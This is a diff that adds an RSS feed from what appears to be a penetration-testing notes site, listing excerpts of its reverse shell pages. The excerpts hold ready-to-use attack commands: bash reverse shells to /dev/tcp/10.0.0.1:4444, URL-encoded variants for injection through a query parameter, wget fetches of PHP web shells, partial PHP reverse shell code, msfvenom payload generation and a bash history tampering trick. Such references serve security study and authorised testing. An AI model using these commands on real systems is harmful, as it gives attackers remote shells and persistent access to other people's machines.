@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Shell on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/shell/</link>
+    <description>Recent content in Shell on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:55:12 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/shell/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Reverse Shell with Pwncat</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
+      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
+    </item>
+    <item>
+      <title>Reverse Shell Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
+      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
+    </item>
+    <item>
+      <title>Web Reverse Shell</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
+      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
+      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
+    </item>
+    <item>
+      <title>Reverse Shell with Metasploit</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</link>
+      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</guid>
+      <description>Generate Reverse Shell Payload link1. Create a Payload using MsfVenom link # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &amp;gt; shell.elf # Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx 2. Start Listener using MsfConsole link msfconsole msf&amp;gt; use exploit/multi/handler # Linux msf&amp;gt; set payload linux/x86/meterpreter/reverse_tcp # Windows msf&amp;gt; set payload windows/meterpreter/reverse_tcp # or msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp msf&amp;gt; set lhost 10.</description>
+    </item>
+    <item>
+      <title>Bash History Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/bash-history-attack/</link>
+      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/bash-history-attack/</guid>
+      <description>Bash History Unveiling link.bash_history is commonly in user’s home directory. In order not to store the bash history, users can link /dev/null with this file as below.&#xA;# If victim uses bash... ln -sf /dev/null ~/.bash_history # If victim users zsh... ln -sf /dev/null ~/.zsh_history Exploitation linkIf attackers can login as victim user, they can unlink /dev/null then allow the bash history to be stored. If HISTFILE variable does not appear in .</description>
+    </item>
+    <item>
+      <title>Upgrade to Fully Interactive TTY</title>
+      <link>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</link>
+      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</guid>
+      <description>Upgrade linkAfter connecting to the target shell with reverse shell, it&amp;rsquo;s recommended to make the shell to be more elegant.&#xA;python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python2 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or SHELL=/bin/bash script -q /dev/null The commands below make our shell even more perfect.&#xA;Ctrl&amp;#43;z stty raw -echo;fg Enter x2 export TERM=xterm </description>
+    </item>
+  </channel>
+</rss>
